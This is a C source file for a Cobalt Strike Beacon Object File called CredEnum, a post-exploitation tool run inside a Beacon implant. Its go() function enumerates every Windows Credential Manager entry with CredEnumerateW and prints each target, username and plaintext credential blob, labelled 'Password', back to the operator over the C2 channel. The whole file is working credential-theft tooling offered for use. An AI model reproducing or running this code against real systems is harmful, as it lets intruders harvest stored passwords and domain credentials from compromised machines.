#include "CredEnum.h"

void displayFileTime(PFILETIME pFileTime, formatp *obj)
{
    SYSTEMTIME systemTime;
    LPWSTR Date = NULL;
    int size = 0;

    if (KERNEL32$FileTimeToSystemTime(pFileTime, &systemTime))
    {
        size = KERNEL32$GetDateFormatW(LOCALE_USER_DEFAULT, 0, &systemTime, NULL, Date, 0);
        size = size + KERNEL32$GetTimeFormatW(LOCALE_USER_DEFAULT, 0, &systemTime, NULL, Date, 0);

        Date = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size);

        if (KERNEL32$GetDateFormatW(LOCALE_USER_DEFAULT, 0, &systemTime, NULL, Date, size))
        {
            BeaconFormatPrintf(obj, "LastWritten     : %ls", Date);

            if (KERNEL32$GetTimeFormatW(LOCALE_USER_DEFAULT, 0, &systemTime, NULL, Date, size))
            {
                BeaconFormatPrintf(obj, " %ls\n", Date);
            }
        }
    }
}

// Have to change this to better way (enum)
wchar_t *ConvertType(DWORD value)
{

    wchar_t *type = NULL;

    if (value == 0x1)
    {
        type = L"CRED_TYPE_GENERIC";
    }
    else if (value == 0x2)
    {
        type = L"CRED_TYPE_DOMAIN_PASSWORD";
    }
    else if (value == 0x3)
    {
        type = L"CRED_TYPE_DOMAIN_CERTIFICATE";
    }
    else if (value == 0x4)
    {
        type = L"CRED_TYPE_DOMAIN_VISIBLE_PASSWORD";
    }
    else if (value == 0x5)
    {
        type = L"CRED_TYPE_GENERIC_CERTIFICATE";
    }
    else if (value == 0x6)
    {
        type = L"CRED_TYPE_DOMAIN_EXTENDED";
    }
    else if (value == 0x7)
    {
        type = L"CRED_TYPE_MAXIMUM";
    }
    else if (value == (0x7 + 1000))
    {
        type = L"CRED_TYPE_MAXIMUM_EX";
    }
    else
    {
        type = L"UNKNOWN_TYPE";
    }

    return type;
}

wchar_t *ConvertPersist(DWORD value)
{

    wchar_t *persist = NULL;

    if (value == 0x1)
    {
        persist = L"CRED_PERSIST_SESSION";
    }

    else if (value == 0x2)
    {
        persist = L"CRED_PERSIST_LOCAL_MACHINE";
    }
    else if (value == 0x3)
    {
        persist = L"CRED_PERSIST_ENTERPRISE";
    }
    else
    {
        persist = L"UNKNOWN_PERSIST";
    }

    return persist;
}

VOID go(IN PCHAR Args, IN ULONG Length)
{
    DWORD dwCount;
    PCREDENTIALW *creds;
    formatp credObj;
    char *data;
    int size;

    BeaconPrintf(CALLBACK_OUTPUT, "===== CredEnum =====\n");

    if (!ADVAPI32$CredEnumerateW(NULL, 1, &dwCount, &creds))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to enum credentials");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Found %lu credential(s)\n", dwCount);

    for (DWORD i = 0; i < dwCount; i++)
    {
        BeaconFormatAlloc(&credObj, 2000);

        BeaconFormatPrintf(&credObj, "Target          : %ls\n", creds[i]->TargetName);
        BeaconFormatPrintf(&credObj, "Comment         : %ls\n", creds[i]->Comment);
        BeaconFormatPrintf(&credObj, "Username        : %ls\n", creds[i]->UserName);
        BeaconFormatPrintf(&credObj, "Password        : %ls\n", creds[i]->CredentialBlob);
        BeaconFormatPrintf(&credObj, "Password Size   : %d\n", creds[i]->CredentialBlobSize);
        BeaconFormatPrintf(&credObj, "CredentialType  : %ls\n", ConvertType(creds[i]->Type));
        BeaconFormatPrintf(&credObj, "PersistenceType : %ls\n", ConvertPersist(creds[i]->Persist));
        displayFileTime(&creds[i]->LastWritten, &credObj);

        data = BeaconFormatToString(&credObj, &size);
        BeaconOutput(CALLBACK_OUTPUT, data, size);
        BeaconFormatReset(&credObj);
    }

Cleanup:
    if (creds != NULL)
    {
        ADVAPI32$CredFree(creds);
    }

    BeaconFormatFree(&credObj);
}